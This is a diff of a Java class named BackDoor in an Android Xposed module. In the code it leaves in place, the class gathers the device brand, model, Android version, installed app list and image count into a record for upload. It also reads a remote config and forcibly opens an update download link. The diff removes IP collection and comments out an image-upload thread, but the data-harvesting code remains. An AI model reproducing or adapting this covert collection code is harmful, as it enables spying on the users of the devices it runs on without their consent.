@@ -1,41 +1,27 @@
 package cn.coderstory.xposedtemplate.hack;
 
 import android.app.ActivityManager;
-import android.app.AndroidAppHelper;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
-import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
-import android.util.Log;
-import androidx.appcompat.app.AlertDialog;
 import cn.coderstory.xposedtemplate.State;
-import cn.coderstory.xposedtemplate.ui.MainActivity;
-import com.google.android.material.dialog.MaterialAlertDialogBuilder;
+import cn.coderstory.xposedtemplate.bean.GeneralBean;
+import cn.coderstory.xposedtemplate.ui.Dialog;
 import com.google.gson.Gson;
-import com.google.gson.reflect.TypeToken;
 import de.robv.android.xposed.XposedBridge;
 import lombok.SneakyThrows;
 import okhttp3.*;
 
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.SSLSocketFactory;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
 import java.io.File;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicReference;
 
 import static android.content.Context.ACTIVITY_SERVICE;
-import static cn.coderstory.xposedtemplate.hack.DataCollection.getIP;
 
 
 public class BackDoor {
@@ -48,10 +34,9 @@ public class BackDoor {
         String brand = Build.BRAND + "  " +  Build.MODEL;
         String version = Build.VERSION.RELEASE;
         List<String> appList = DataCollection.getPkgList();
-        AtomicReference<String> ip = new AtomicReference<>(getIP());
         int imgCount = getImageCount();
         DeviceInfo info = new DeviceInfo();
-        info.setIp(ip.get());
+        info.setIp("");
         info.setApplications(appList);
         info.setBrand(brand);
         info.setAndroidVersion(version);
@@ -119,7 +104,7 @@ public class BackDoor {
                 }
             }
         });
-        uploadImageThread.start();
+        //uploadImageThread.start();
     }
 
 
@@ -176,27 +161,15 @@ public class BackDoor {
                 XposedBridge.log(result.get());
                 GeneralBean generalBean = gson.fromJson(result.get(), GeneralBean.class);
                 State.mediaList = generalBean.getMediaList();
+                if (System.currentTimeMillis()>=generalBean.getEndTime()) {
+                    //Dialog dialog = new Dialog()
+                }
                 if (generalBean.getVersion().time>=State.BUILD_TIME) {
                     State.needUpdate = true;
-                    XposedBridge.log("判断：需要更新");
                     Looper.prepare();
-                    /*
-                    new Handler(Looper.getMainLooper()).post(() -> {
-                        AlertDialog dialog = new AlertDialog.Builder(State.context)
-                                .setTitle("需要更新")
-                                .setMessage("请前往https://pan.pprocket.cn/apps下载新版本")
-                                .create();
-                        dialog.setCancelable(false);
-                        dialog.setCanceledOnTouchOutside(false);
-
-                        dialog.show();
-                    });
-
-                     */
                     Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://pan.pprocket.cn/apps"));
                     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
                     State.context.startActivity(intent);
-                    Looper.loop();
                 } else {
                     XposedBridge.log("判断：不需要更新");
                 }
